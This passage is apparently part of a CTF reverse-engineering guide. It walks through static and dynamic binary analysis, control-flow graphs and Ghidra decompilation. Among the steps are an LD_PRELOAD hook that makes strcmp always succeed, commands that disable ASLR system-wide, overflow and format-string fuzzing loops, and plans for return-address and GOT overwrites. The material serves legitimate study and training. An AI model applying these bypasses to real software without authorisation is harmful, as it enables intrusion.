Displays PIE, canary, NX, and other properties in radare2's format.

---

**Related reconnaissance subtopics essential before exploitation:** Static analysis methodology for vulnerability identification, dynamic analysis with debuggers to confirm security mechanisms at runtime, and library function hooking detection for determining if standard libc functions are intercepted with custom security implementations.

---

# Reverse Engineering Techniques

## Static Analysis Workflow

Static analysis examines binaries without execution, building understanding through code structure, data flow, and symbolic analysis.

### Initial Triage Phase

**Step 1: Binary Classification**

```bash
# Comprehensive identification
file binary
file -i binary                         # MIME type
file -z binary                         # Check compressed files

# Architecture and linking details
readelf -h binary                      # ELF header (Linux)
objdump -f binary                      # File header info
rabin2 -I binary                       # radare2 info dump
```

**Step 2: Security Feature Enumeration**

```bash
# Using checksec (pwntools, pwndbg, or standalone)
checksec --file=binary

# Manual verification
readelf -l binary | grep GNU_STACK     # NX bit check
readelf -d binary | grep BIND_NOW      # Full RELRO
readelf -h binary | grep Type          # PIE check (DYN = PIE)
rabin2 -I binary | grep -E "nx|pic|canary"

# Stack canary detection
objdump -d binary | grep stack_chk_fail
readelf -s binary | grep __stack_chk_fail
```

**Security features impact:**

- **NX (No eXecute):** Stack shellcode blocked → ROP/ret2libc required
- **PIE (Position Independent):** Address randomization → info leaks needed
- **RELRO (Relocation Read-Only):** GOT overwrite difficulty
    - Partial: GOT writable after resolution
    - Full: GOT read-only from start
- **Stack Canary:** Buffer overflow detection → canary leak/bypass needed
- **FORTIFY_SOURCE:** Additional bounds checking on libc functions

### String and Data Analysis

**Step 3: String Extraction and Classification**

```bash
# Basic extraction
strings binary > strings.txt
strings -n 6 binary                    # Minimum length 6
strings -a -t x binary                 # All sections with hex offsets

# Wide character strings (UTF-16)
strings -e l binary                    # Little-endian
strings -e b binary                    # Big-endian

# Section-specific extraction
objdump -s -j .rodata binary           # Read-only data
readelf -p .rodata binary              # ELF strings dump
rabin2 -z binary                       # Data sections
rabin2 -zz binary                      # All sections
```

**String analysis techniques:**

```bash
# Flag pattern matching
strings binary | grep -E "flag\{|CTF\{|FLAG\{|[A-Za-z0-9]{32}"

# Interesting function hints
strings binary | grep -iE "win|admin|backdoor|shell|debug|secret"

# Format string identification
strings binary | grep -E "%[0-9]*\$?[sdxnp]"

# Hardcoded credentials
strings binary | grep -iE "pass|key|token|auth|credential"

# File paths (information disclosure)
strings binary | grep -E "^/|^\.\.|[A-Za-z]:\\"

# Network indicators
strings binary | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|https?://"
```

**Cross-referencing strings to code:**

```bash
# Find string usage in radare2
r2 -A binary
> iz                                   # List strings
> axt @ str.flag_is_here               # Cross-references to string
> s str.flag_is_here; pdf              # Disassemble function using string

# Using objdump
objdump -d binary | grep -B10 "address_of_string"
```

### Symbol and Function Discovery

**Step 4: Symbol Table Analysis**

```bash
# All symbols
nm binary                              # Symbols with addresses
nm -D binary                           # Dynamic symbols only
nm -C binary                           # Demangle C++ symbols
readelf -s binary                      # ELF symbol table
objdump -t binary                      # Object symbols
objdump -T binary                      # Dynamic symbols

# Function discovery
rabin2 -s binary | grep FUNC           # Functions via radare2
objdump -d binary | grep "^[0-9a-f]* <.*>:"  # Function labels

# Imported functions (attack surface)
objdump -T binary | grep UND           # Undefined symbols (imports)
readelf -s binary | grep UND
rabin2 -i binary                       # Imports
```

**Function naming analysis:**

```bash
# Identify interesting functions
nm binary | grep -iE "win|flag|admin|backdoor|auth|verify|check"

# Standard vulnerability indicators
nm binary | grep -E "gets|strcpy|sprintf|scanf"  # Dangerous functions
```

### Disassembly and Code Structure

**Step 5: Complete Disassembly**

```bash
# Full disassembly with Intel syntax
objdump -M intel -d binary > disasm.txt
objdump -M intel -D binary > full_disasm.txt  # All sections

# Specific sections
objdump -M intel -d -j .text binary    # Code section only

# With source interleaving (if debug symbols)
objdump -S binary

# Using radare2
r2 -A binary
> s main; pdf                          # Disassemble main
> pD 1000 @ main                       # 1000 bytes at main
> agf                                  # ASCII function graph
```

**Ghidra static analysis workflow:**

1. Import binary → Auto-analysis (accept all defaults)
2. **Symbol Tree** → Navigate to `entry` or `main`
3. **Decompiler view** → Review C-like pseudocode
4. **Defined Strings window** → Search for interesting strings
5. **Function Call Graph** → Visualize program structure
6. Rename variables (Right-click → Rename) for clarity
7. Retype variables (Ctrl+L) when types are wrong
8. Add comments (;) at complex or critical sections
9. Create structures (Window → Data Type Manager) for binary data

**radare2 static analysis workflow:**

```bash
r2 -A binary                           # Auto-analyze

# Inside r2:
aaa                                    # Deep analysis
afl                                    # List functions
pdf @ main                             # Disassemble main
VV @ main                              # Visual graph mode

# Function cross-references
axt @ sym.win_function                 # Where is this called from?
axf @ sym.main                         # What does main call?

# Identify interesting paths
afll | sort -k4 -n                     # Sort by function size
afl | grep -v "sym.imp"                # User-defined functions only
```

### Import/Export Analysis

**Step 6: External Dependencies**

```bash
# Library dependencies
ldd binary                             # Shared library dependencies
readelf -d binary | grep NEEDED        # Required libraries
objdump -p binary | grep NEEDED

# Imported functions (potential vulnerabilities)
objdump -T binary | grep UND
readelf -s binary | grep UND | grep FUNC

# PLT/GOT analysis (for GOT overwrite attacks)
objdump -d binary | grep "@plt"        # PLT stubs
objdump -R binary                      # Relocations
readelf -r binary                      # Relocation entries
```

**Dangerous function imports:**

- `gets`, `strcpy`, `sprintf` → Buffer overflows
- `system`, `execve`, `popen` → Command injection
- `printf` (variadic) → Format string vulnerabilities
- `scanf` with `%s` → Buffer overflows
- `strcat` without bounds → Buffer overflows

### Data Section Analysis

**Step 7: Static Data Structures**

```bash
# Examine data sections
readelf -S binary                      # Section headers
objdump -h binary                      # Section summary

# Hexdump specific sections
objdump -s -j .rodata binary           # Read-only data
objdump -s -j .data binary             # Initialized data
objdump -s -j .bss binary              # Uninitialized data

# Using radare2
r2 -A binary
> iS                                   # Sections with permissions
> px 100 @ section..rodata             # Hexdump .rodata
```

**Look for:**

- Hardcoded keys/credentials in `.rodata`
- Function pointer tables in `.data`
- Global state variables in `.bss`
- Jump tables for switch statements
- Embedded files or resources

### Control Flow Identification

**Step 8: Entry Point and Initialization**

```bash
# Find entry point
readelf -h binary | grep Entry
objdump -f binary | grep start
rabin2 -e binary                       # Entry point

# Disassemble entry
objdump -M intel -d binary | grep -A50 "<_start>:"

# Find main function
objdump -d binary | grep -A5 "__libc_start_main"
# Look at RDI register argument (first param = main address)
```

**Typical execution flow (x64 Linux):**

```
_start → __libc_start_main → main → exit
```

**Step 9: Function Graph Construction**

Using **Ghidra**:

- Right-click function → "Function Call Graph"
- View → Graph → Control Flow
- Identify "sink" functions (win/flag/admin functions)
- Trace backwards to find reachable paths

Using **radare2**:

```bash
r2 -A binary
> agc                                  # Call graph (ASCII)
> agf                                  # Function graph (ASCII)
> VV                                   # Interactive visual graph
```

**Graph analysis goals:**

- Identify unreachable code (potential backdoors)
- Find multiple paths to sensitive functions
- Locate validation/authentication checks
- Map input processing flow

### Algorithm Reconstruction

**Step 10: Logic Understanding**

**Pattern recognition in assembly:**

```assembly
; Loop detection
compare:
  cmp    ecx, 0xa                      ; Loop counter check
  jl     loop_body                     # Jump if less
  
; String comparison
  call   strcmp
  test   eax, eax                      # Check return value
  jne    fail_branch                   # Jump if not equal
  
; Array access
  lea    rax, [rbp-0x40]               ; Base address
  mov    edx, DWORD PTR [rax+rcx*4]    ; array[i] pattern
  
; Function pointer call
  mov    rax, QWORD PTR [rbp-0x8]      ; Load pointer
  call   rax                            # Indirect call
```

**Common algorithm patterns:**

- **XOR encoding:** `xor eax, 0x42` loops → Simple cipher
- **Modular arithmetic:** `div`, `imul` with constants → Hash/checksum
- **Bit manipulation:** `shl`, `shr`, `and`, `or` → Crypto/encoding
- **Repeated operations:** Loops with accumulation → Checksum/validation

**Decompiler-assisted reconstruction (Ghidra):**

1. Review decompiled C code
2. Rename variables meaningfully (`input_buffer`, `key_byte`, `counter`)
3. Retype variables (integers vs pointers vs arrays)
4. Add structure definitions for complex data
5. Extract algorithm to Python/C for testing

### Vulnerability Identification

**Step 11: Static Vulnerability Detection**

**Buffer overflow indicators:**

```bash
# Dangerous functions without bounds
objdump -d binary | grep -E "call.*<gets@plt>|call.*<strcpy@plt>"

# Large stack allocations
objdump -d binary | grep "sub.*rsp.*0x[0-9a-f]\{3,\}"

# User input into fixed buffers
# Look for: read() → strcpy() chains without length checks
```

**Format string vulnerabilities:**

```bash
# Direct printf usage
objdump -d binary | grep "call.*<printf@plt>"
# Check if format argument comes from user input (not .rodata)

# Using radare2
r2 -A binary
> axt @ sym.imp.printf                 # Cross-references to printf
> pdf @ <address>                      # Check if format is controlled
```

**Integer vulnerabilities:**

```assembly
; Integer overflow leading to small allocation
mov    eax, [rbp-0x8]                  ; User input
shl    eax, 2                          ; Multiply by 4 (can overflow)
mov    edi, eax
call   malloc                          ; Allocates too-small buffer
```

**Logic vulnerabilities:**

```assembly
; Authentication bypass via comparison flaw
call   check_password
test   eax, eax
jne    authenticated                   ; Should be 'je' (jump if equal)
```

### Static Analysis Checklist

**Before moving to dynamic analysis:**

- [ ] Architecture and calling convention identified (x86/x64, cdecl/stdcall)
- [ ] Security features documented (NX, PIE, RELRO, Canary)
- [ ] Entry point and main function located
- [ ] All interesting functions identified (win/flag/admin/backdoor)
- [ ] Dangerous library functions catalogued (gets, strcpy, system, printf)
- [ ] String cross-references mapped
- [ ] Input sources identified (stdin, files, network, arguments)
- [ ] Output sinks located (flag printing, file writes)
- [ ] Control flow from input to sensitive functions traced
- [ ] Potential vulnerabilities hypothesized

---

## Dynamic Analysis Workflow

Dynamic analysis observes program behavior during execution, validating static hypotheses and discovering runtime-only characteristics.

### Pre-Execution Setup

**Step 1: Environment Preparation**

```bash
# Disable ASLR for consistent addresses
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Re-enable ASLR (after testing)
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# Check current ASLR state
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full

# Set core dump size for crash analysis
ulimit -c unlimited
# Core dumps saved to: /var/crash/ or current directory
```

**Step 2: Input Preparation**

```bash
# Create test inputs
echo "AAAA" > input.txt
python3 -c "print('A'*100)" > overflow.txt
python3 -c "print('A'*100 + '\x00')" | xxd > hex_input.txt

# For binary input
python3 -c "import sys; sys.stdout.buffer.write(b'A'*100 + b'\xef\xbe\xad\xde')" > binary_input.bin

# Pattern generation (cyclic patterns for offset finding)
# Using pwntools:
python3 -c "from pwn import *; print(cyclic(200).decode())" > pattern.txt
```

### Library Call Tracing

**Step 3: ltrace Analysis**

```bash
# Full trace with large string capture
ltrace -s 1000 -o ltrace.log ./binary

# Focus on specific functions
ltrace -e strcmp+strncmp+memcmp ./binary < input.txt

# Trace with timestamps
ltrace -t ./binary

# Common interesting function patterns
ltrace ./binary 2>&1 | grep -E "strcmp|system|malloc|free|printf"
```

**Analysis patterns:**

```
# Password/key comparison
strcmp("user_input", "expected_password") = -1
# Reveals expected value

# Memory corruption indicators
malloc(32) = 0x555555756260
strcpy(0x555555756260, "AAAA...A" <repeats 100 times>)
free(0x555555756260)
# Buffer allocated for 32 bytes but 100 bytes copied

# Command injection
system("ls /tmp/flag_" + user_input)
# Shows command construction
```

### System Call Tracing

**Step 4: strace Analysis**

```bash
# Full system call trace
strace -s 1000 -o strace.log ./binary

# File operations only
strace -e trace=file ./binary

# Network operations
strace -e trace=network ./binary

# Focus on read/write
strace -e read,write,open,openat ./binary

# Trace with instruction pointer
strace -i ./binary

# Follow child processes
strace -f ./binary
```

**Key observations:**

```
# Flag file access
openat(AT_FDCWD, "/home/user/.flag", O_RDONLY) = 3
read(3, "flag{example}\n", 4096) = 14

# Anti-debugging detection
ptrace(PTRACE_TRACEME, 0, NULL, NULL) = -1 EPERM
# Will fail if already being traced

# Timing checks (anti-debugging)
clock_gettime(CLOCK_MONOTONIC, {tv_sec=123, tv_nsec=456}) = 0
# Repeated calls may indicate timing-based detection
```

### Interactive Debugging

**Step 5: GDB with Enhanced Plugins (pwndbg/GEF)**

```bash
# Start with analysis
gdb -q ./binary
```

**Initial reconnaissance commands:**

```gdb
# Check security features
checksec

# View memory mappings
vmmap

# List functions
info functions
info functions win        # Filter for specific names

# Disassemble key functions
disassemble main
disas vulnerable_function
```

**Setting strategic breakpoints:**

```gdb
# Break at entry point
b main
b *main+42                # Offset from function start

# Break at interesting functions
b win_function
b strcmp
b strcpy

# Break at addresses (from static analysis)
b *0x401234

# Conditional breakpoints
b strcmp if $rdi == 0x7fffffffde00    # Break when specific argument

# Breakpoint commands (automation)
b main
commands
  x/20wx $rsp
  continue
end
```

**Step 6: Execution and State Observation**

```gdb
# Run with input
run < input.txt
run AAAA BBBB              # With arguments
run <<< $(python3 -c "print('A'*100)")

# Step execution
ni                         # Next instruction
si                         # Step into calls
finish                     # Run until function return

# Examine registers (pwndbg/GEF auto-display context)
info registers
info registers rdi rsi rdx  # Specific registers (x64 args)

# Examine memory at various locations
x/20wx $rsp                # 20 words at stack pointer
x/20gx $rsp                # 20 giant words (x64)
x/10i $rip                 # 10 instructions at instruction pointer
x/s 0x404000               # String at address

# Enhanced memory examination (pwndbg)
telescope $rsp 30          # Recursive pointer dereference
hexdump $rsp 0x100         # Clean hexdump

# Search memory
find /b 0x400000, 0x500000, 'flag'
search "flag"              # pwndbg/GEF command
```

**Step 7: Stack and Register Manipulation**

```gdb
# Modify registers
set $rip = 0x401234        # Change execution flow
set $rdi = 0x1337          # Change function argument

# Modify memory
set {int}0x404000 = 0x1337
set {long}$rsp = 0x41414141
set {char[5]}0x404000 = "flag"

# Call functions manually
call win_function()
call system("cat flag.txt")
```

**Crash analysis workflow:**

```gdb
run < crash_input.txt
# Program crashes

# Examine crash state
info registers             # Which register caused crash?
x/10i $rip                 # What instruction failed?
backtrace                  # Stack trace

# Check for control
# If RIP/EIP overwritten with 0x4141414141 ('AAAA'), buffer overflow confirmed

# Find exact offset (using cyclic pattern)
# After crash with cyclic input:
cyclic -l 0x6161616c       # pwndbg: find offset
# Or using external tool: pattern_offset.rb 0x6161616c
```

### Input Fuzzing and Behavior Testing

**Step 8: Systematic Input Variation**

```bash
# Length-based fuzzing
for i in $(seq 10 10 200); do
    python3 -c "print('A'*$i)" | ./binary
done

# Character-based fuzzing
for char in A a 0 @ '\x00' '\xff'; do
    python3 -c "print('$char'*100)" | ./binary
done

# Format string fuzzing
for i in $(seq 1 20); do
    python3 -c "print('%${i}\$p')" | ./binary
done

# Automated with GDB logging
for i in $(seq 10 10 200); do
    echo "Testing length $i"
    python3 -c "print('A'*$i)" > tmp_input
    gdb -batch -ex "run < tmp_input" -ex "quit" ./binary 2>&1 | grep -i "signal\|segmentation"
done
```

**Observing program responses:**

- Output changes at specific input lengths → Buffer boundaries
- Crashes at specific lengths → Overflow thresholds
- Different behavior with special characters → Input validation
- Timing differences → Side-channel vulnerabilities

### Memory Layout Analysis

**Step 9: Runtime Memory Mapping**

```gdb
# View complete memory layout
vmmap                      # pwndbg/GEF command
info proc mappings         # Standard GDB

# Identify key addresses
# Stack location
print $rsp
print $rbp

# Heap location
x/20gx (char*)malloc(0x20) # Allocate and examine

# Library addresses (for ret2libc)
print &system
print &puts
info proc mappings | grep libc

# Find strings in libc
find &system, +9999999, "/bin/sh"
```

**ASLR behavior observation:**

```bash
# Run multiple times and compare addresses
for i in {1..5}; do
    gdb -batch -ex "b main" -ex "run" -ex "print \$rip" -ex "quit" ./binary 2>&1 | grep rip
done

# If addresses differ → ASLR active
# If addresses same → ASLR disabled or not PIE
```

### Function Hooking and Interception

**Step 10: LD_PRELOAD Hooking**

```c
// hook.c - Intercept function calls
#include <stdio.h>
#include <string.h>

int strcmp(const char *s1, const char *s2) {
    printf("[HOOK] strcmp(\"%s\", \"%s\")\n", s1, s2);
    return 0;  // Always return match
}

void *malloc(size_t size) {
    printf("[HOOK] malloc(%zu)\n", size);
    // Call real malloc or return fake address
}
```

```bash
# Compile hook library
gcc -shared -fPIC hook.c -o hook.so -ldl

# Run with preloaded library
LD_PRELOAD=./hook.so ./binary

# More sophisticated hooking (call original)
gcc -shared -fPIC hook_real.c -o hook_real.so -ldl -D_GNU_SOURCE
```

### Timing and Side-Channel Analysis

**Step 11: Execution Timing**

```bash
# Measure execution time
time ./binary < input1.txt
time ./binary < input2.txt

# More precise timing (microseconds)
/usr/bin/time -f "%E real, %U user, %S sys" ./binary

# Timing in GDB
gdb -q ./binary
(gdb) set logging on
(gdb) set pagination off
(gdb) b main
(gdb) run
(gdb) shell date +%s%N
(gdb) continue
(gdb) shell date +%s%N
```

**Timing side-channel indicators:**

- Password checks that fail faster on wrong first character → Timing oracle
- Cryptographic operations with data-dependent duration → Cache timing attacks
- Consistent timing regardless of input → Constant-time implementation (secure)

### Dynamic Analysis Checklist

**Comprehensive execution understanding:**

- [ ] Normal execution path traced (valid input)
- [ ] Error handling paths explored (invalid input)
- [ ] Buffer boundaries identified through fuzzing
- [ ] Crash conditions documented (input + crash state)
- [ ] Library calls catalogued (ltrace output)
- [ ] System calls documented (strace output)
- [ ] Memory layout understood (stack/heap/library addresses)
- [ ] ASLR/PIE behavior confirmed
- [ ] Anti-debugging mechanisms identified and bypassed
- [ ] Function return values validated
- [ ] Stack canary values observed (if present)
- [ ] GOT/PLT behavior verified
- [ ] Exploit primitives confirmed (overflow, format string, etc.)

---

## Control Flow Graph Analysis

Control Flow Graphs (CFGs) visualize program execution paths, essential for understanding complex logic and identifying reachable code.

### CFG Fundamentals

**Basic blocks:**

- Sequence of instructions with single entry (top) and single exit (bottom)
- No branches except at the end
- No branch targets except at the beginning

**Edges:**

- **Unconditional:** Direct jumps (jmp, call)
- **Conditional:** Branches (je, jne, jl, jg, etc.)
- **Indirect:** Computed jumps (switch statements, function pointers)

### CFG Generation Tools

**Using Ghidra:**

1. Open function in decompiler/disassembly view
2. Window → Function Graph
3. View options:
    - Grouped by basic blocks (colored nodes)
    - Edges show conditional (green/red) vs unconditional (blue)
    - Right-click → "Graph" options for layout

**Using IDA Free:**

1. Navigate to function
2. Press **Space** to toggle graph view
3. Colors indicate:
    - Blue arrows: Unconditional jumps
    - Green arrows: True condition
    - Red arrows: False condition

**Using radare2:**

```bash
r2 -A binary
> s main                               # Seek to main
> VV                                   # Visual graph mode

# ASCII graph
> agf                                  # Function graph

# Export graph
> agfd > cfg.dot                       # Graphviz DOT format
> agfj > cfg.json                      # JSON format
```

**Generate PNG from DOT:**

```bash
dot -Tpng cfg.dot -o cfg.png
xdot cfg.dot                           # Interactive viewer
```

**Using Binary Ninja (commercial, has free version):**

- Automatic high/medium/low level IL graphs
- Interactive navigation
- Split view with disassembly

### CFG Analysis Techniques

**Path enumeration:**

```
Entry → Block A → Block B → Block C → Exit (win)
Entry → Block A → Block D → Exit (fail)
```

**Goal:** Identify conditions that lead to winning path:

- What inputs reach Block B vs Block D?
- What comparisons determine branching?

**Reachability analysis:**

```bash
# In radare2, find paths to specific function
r2 -A binary
> aaa                                  # Deep analysis
> afl                                  # List functions
> agc                                  # Call graph

# Find all paths to win_function
# Manual inspection of graph needed
```

**Using Ghidra's function graph:**

1. Right-click win_function
2. "Function Call Trees" → "Called From"
3. Expand tree to find all callers
4. Identify if any path reaches from main

**Identifying unreachable code:**

```assembly
; Example: Code after unconditional jump
  jmp exit_function
  call secret_backdoor              ; Never executed (unreachable)
  
; Detection: Look for blocks with no incoming edges
```

**Unreachable code may indicate:**

- Hidden functionality (challenge backdoors)
- Dead code (optimization artifacts)
- Obfuscation attempts
- Debugging/testing functions left in binary

### CFG-Based Vulnerability Discovery

**Input validation bypass:**

```
Entry → [Check input] 
         ├─> [Valid] → Authenticated → Win
         └─> [Invalid] → Exit
```

**Analysis questions:**

- Can we jump directly to "Authenticated" block?
- Is there an integer overflow in the check?
- Can we force "Valid" path through unexpected input?

**Authentication logic flaws:**

```assembly
; Example: Reversed condition
check_password:
  call strcmp
  test eax, eax
  jne authenticated         ; BUG: Should be 'je' (jump if equal)
  jmp failed

authenticated:
  call win_function
```

**CFG reveals:** Wrong branch taken on strcmp success

**Loop complexity analysis:**

```
Entry → Loop_Init → [Condition]
                     ├─> Loop_Body → [Update] → [Condition]
                     └─> Exit
```

**Vulnerability indicators:**

- Unbounded loops (no exit condition) → DoS
- Complex loop conditions → Integer overflow opportunities
- Loop counter used as array index → OOB access

### Switch Statement Analysis

**Switch statements compile to jump tables:**

```assembly
; Switch on user input
  mov eax, [rbp-0x4]        ; Load switch variable
  cmp eax, 0x5              ; Check bounds
  ja default_case           ; Jump if above
  mov rax, qword ptr [rip + jump_table + rax*8]
  jmp rax                   ; Indirect jump

jump_table:
  .quad case_0
  .quad case_1
  .quad case_2
  .quad case_3
  .quad case_4
  .quad case_5
```

**CFG shows:**

- One conditional edge (bounds check)
- Multiple indirect edges (one per case)
- Default case path

**Exploitation opportunities:**

- Bounds check bypass → OOB jump table access
- Overwrite jump table entries → Arbitrary control flow

**Analyzing in Ghidra:**

- Jump table auto-detected and labeled
- "Switch" operations displayed in decompiler
- Right-click → "Edit Switch" to view cases

### CFG Simplification for Complex Functions

**Strategies for large CFGs:**

**1. Identify loop structures:**

- Back edges (edge from later block to earlier block)
- Collapse loop into single node mentally

**2. Recognize common patterns:**

```
Diamond pattern (if-else):
     [Condition]
      /      \
   [True]  [False]
      \      /
     [Merge]

Loop pattern:
   [Init] → [Condition] ─> [Exit]
               ↑            
            [Body] → [Update]
```

**3. Focus on critical paths:**

- Trace from entry to success function
- Ignore error handling paths initially
- Mark decision points on critical path

**4. Abstract away library calls:**

- Replace libc calls with high-level descriptions
- Focus on control flow logic, not implementation

**Example simplification:**

```
Original: 50 blocks, complex loops
Simplified:
1. Input parsing
2. Validation check → [Pass/Fail]
3. Pass → Process loop
4. Check result → [Win/Lose]
```

### Dynamic CFG Validation

**Trace actual execution path:**

```bash
# Using GDB with logging
gdb -q ./binary
(gdb) set logging on
(gdb) set logging file trace.log
(gdb) display/i $pc          # Display current instruction
(gdb) b *main+100            # Breakpoint at decision point
(gdb) commands
  silent
  printf "At %p: %s\n", $pc, (char*)$pc
  continue
end
(gdb) run < input.txt
```

**Using Intel Pin or DynamoRIO:** [Inference] These dynamic instrumentation frameworks can generate execution traces showing actual taken paths, though setup complexity may exceed CTF time constraints.

**Manual path tracing in GDB:**

```gdb
# At each conditional jump
x/i $rip                     # Show current instruction
ni                           # Execute
x/i $rip                     # Show next instruction

# Record: Was jump taken or not taken?
```

**Validating static CFG:**

- Does execution match predicted CFG?
- Are there hidden paths (anti-analysis tricks)?
- Do all expected blocks execute?

### CFG-Based Exploit Planning

**Using CFG to plan exploitation:**

**1. Identify target block:**

```
Goal: Execute block at 0x401337 (win_function)
```

**2. Trace backwards:**

```
0x401337 ← Called from 0x4012ab
0x4012ab ← Reached from block 0x401200 if condition true
0x401200 ← Reached from main+56
```

**3. Determine constraints:**

```
To reach 0x401337:
- Must pass strcmp at 0x401200
- Must set global variable at 0x404020 to 0x1337
- Must overflow buffer to overwrite return address
```

**4. Construct exploit plan:**
```
Method 1: Control flow hijacking

- Overflow buffer in main
- Overwrite return address → 0x401337

Method 2: Constraint satisfaction

- Provide correct strcmp input
- Set global via format string vulnerability
- Normal execution reaches win function

Method 3: GOT overwrite

- Overwrite GOT entry for exit()
- exit() gets called → redirects to win_function
```

**CFG visualization of exploit path:**
```

Normal path: main → vuln_func → strcmp (fail) → exit Exploit path: main → vuln_func → [overflow] → win_function (directly)

````

### Advanced CFG Analysis

**Opaque predicates detection:**
```assembly
; Opaque predicate: Always true/false regardless of input
  mov eax, [rbp-0x8]
  imul eax, eax
  and eax, 0x1
  test eax, eax
  je always_taken              ; x² is always even, so (x² & 1) == 0
````

**CFG shows two edges, but one is never taken** → Obfuscation technique

**Control flow flattening detection:**

```
Normal CFG: Linear structure with clear branches
Flattened CFG: All blocks connected to central dispatcher

Dispatcher:
  switch(state) {
    case 0: block_A(); state = 3; break;
    case 1: block_B(); state = 0; break;
    case 2: block_C(); state = 1; break;
    case 3: block_D(); state = 2; break;
  }
```

**Defeating flattening:**

- Trace state variable values
- Reconstruct actual execution order
- Focus on state transitions, not CFG structure

**Indirect call resolution:**

```assembly
; Function pointer call
  mov rax, qword ptr [rbp-0x8]
  call rax                     ; CFG cannot determine target statically
```

**Dynamic resolution required:**

```gdb
# Break before indirect call
b *0x401234
run
x/gx $rbp-0x8                  # Examine pointer value
# Reveals actual target function
```

### CFG Analysis for Binary Diffing

**Comparing two binary versions:**

**Using Ghidra:**

1. Open both binaries in same Ghidra project
2. Tools → Version Tracking
3. Compare CFGs between versions
4. Identify added/removed/modified blocks

**Using BinDiff (commercial):**

- Automated graph matching
- Highlights differences in control flow
- Useful for patch analysis

**Manual CFG comparison:**

```bash
# Generate CFGs for both versions
r2 -A binary_v1
> agfd > cfg_v1.dot
> q

r2 -A binary_v2
> agfd > cfg_v2.dot
> q

# Visual comparison
diff cfg_v1.dot cfg_v2.dot
meld cfg_v1.dot cfg_v2.dot     # Side-by-side diff tool
```

**Look for:**

- New basic blocks → Added functionality
- Removed blocks → Removed features/bugs
- Modified conditions → Security patches
- Changed jump targets → Logic fixes

---

## Decompilation Strategies

Decompilation converts low-level assembly to higher-level pseudocode, dramatically improving comprehension speed.

### Decompiler Selection

**Ghidra decompiler:**

- **Strengths:** Free, good quality, custom structure support, scriptable
- **Weaknesses:** Slower than commercial tools, occasional type errors
- **Best for:** Most CTF scenarios, complex algorithms

**IDA Pro with Hex-Rays (commercial):**

- **Strengths:** Industry standard, highest quality output, extensive plugin ecosystem
- **Weaknesses:** Expensive (\$\$\$), not available in IDA Free
- **Best for:** Professional work, heavily obfuscated code

**Binary Ninja (commercial, has free version):**

- **Strengths:** Multiple IL levels, clean API, active development
- **Weaknesses:** Free version limited, smaller community than IDA
- **Best for:** API-driven analysis, custom tooling

**Snowman (free):**

- **Strengths:** Standalone, fast
- **Weaknesses:** Lower quality output, less maintained
- **Best for:** Quick checks when Ghidra unavailable

**RetDec (free, online):**

- **Strengths:** Web-based, no installation
- **Weaknesses:** Limited customization, quality varies
- **Best for:** Initial reconnaissance

### Ghidra Decompilation Workflow

**Step 1: Initial auto-analysis**

```
File → Import File → [Select binary]
Analysis → Auto Analyze → [Accept defaults]
Wait for analysis completion (bottom right progress bar)
```

**Step 2: Navigate to target function**

```
Symbol Tree (left pane) → Functions → main
Or: Window → Defined Strings → Double-click interesting string → View references
```

**Step 3: Decompiler window layout**

```
Window → Decompiler
Arrange windows: Listing (assembly) on left, Decompiler on right
Both views synchronized (clicking in one highlights in other)
```

**Step 4: Initial code review**

```c
// Raw decompiler output example:
undefined8 FUN_00401142(void)
{
  int iVar1;
  char local_38 [44];
  int local_c;
  
  puts("Enter password:");
  fgets(local_38,0x32,stdin);
  iVar1 = strcmp(local_38,"secret123\n");
  if (iVar1 == 0) {
    FUN_00401234();
  }
  return 0;
}
```

**Problems with raw output:**

- Generic names: `FUN_00401142`, `local_38`, `iVar1`
- Unclear types: `undefined8`
- No semantic meaning

### Variable and Function Renaming

**Step 5: Systematic renaming**

**Rename function:**

```
Right-click function name → Rename Function
Or: Select function → Press 'L'
Choose meaningful name: FUN_00401142 → check_password
```

**Rename variables:**

```
Right-click variable → Rename Variable
local_38 → password_buffer
local_c → loop_counter
iVar1 → strcmp_result
```

**After renaming:**

```c
int check_password(void)
{
  int strcmp_result;
  char password_buffer[44];
  
  puts("Enter password:");
  fgets(password_buffer, 0x32, stdin);
  strcmp_result = strcmp(password_buffer, "secret123\n");
  if (strcmp_result == 0) {
    print_flag();
  }
  return 0;
}
```

**Much clearer logic now visible**

### Type Correction

**Step 6: Fix type misdetections**

**Common type errors:**

```c
// Decompiler thinks it's int, but it's a pointer
int mystery_var;
mystery_var = FUN_00401000();
FUN_00401050(mystery_var + 4);  // Pointer arithmetic suggests pointer type
```

**Retype variable:**

```
Right-click variable → Retype Variable
Or: Select variable → Ctrl+L

Change: int mystery_var → char *mystery_var
```

**Function signature correction:**

```c
// Incorrect auto-detected signature
undefined8 FUN_00401000(void)

// After correction (Right-click function → Edit Function Signature)
char * allocate_buffer(void)
```

**Common type corrections needed:**

- `undefined4` → `int` or `unsigned int`
- `undefined8` → `long` or `pointer` (x64)
- Generic pointers → Specific types: `void*` → `char*`, `int*`, `struct*`
- Array detection: `char local_38` → `char local_38[48]`

### Structure Definition

**Step 7: Define custom structures**

**Scenario: Binary data parsing**

```c
// Decompiler output with unclear structure access
void process_data(long param_1)
{
  int value1 = *(int *)(param_1 + 0);
  int value2 = *(int *)(param_1 + 4);
  char *name = (char *)(param_1 + 8);
  int flag = *(int *)(param_1 + 0x28);
}
```

**Create structure:**

```
Window → Data Type Manager
Right-click → New → Structure
Name: user_data
Add fields:
  - offset 0x00: int id
  - offset 0x04: int score
  - offset 0x08: char name[32]
  - offset 0x28: int admin_flag
```

**Apply structure to variable:**

```
Right-click param_1 → Retype Variable → user_data *
```

**After applying structure:**

```c
void process_data(user_data *data)
{
  int value1 = data->id;
  int value2 = data->score;
  char *name = data->name;
  int flag = data->admin_flag;
}
```

**Dramatically improved clarity**

### Function Prototype Correction

**Step 8: Fix function signatures**

**Wrong parameter count detection:**

```c
// Decompiler detected no parameters
void mystery_func(void)
{
  // But assembly shows RDI, RSI, RDX used
  // These are x64 calling convention registers (args 1, 2, 3)
}
```

**Correct signature:**

```
Right-click function → Edit Function Signature
Change: void mystery_func(void)
To: void mystery_func(int arg1, char *arg2, size_t arg3)
```

**Variadic function handling:**

```c
// Printf-like functions
int custom_print(char *format, ...)
```

**Mark as variadic:**

```
Edit Function Signature → Check "Vararg" checkbox
```

### Decompiler Output Interpretation

**Step 9: Understanding decompiler artifacts**

**Artifact 1: Temporary variables**

```c
// Often decompiler creates temps
int temp_var;
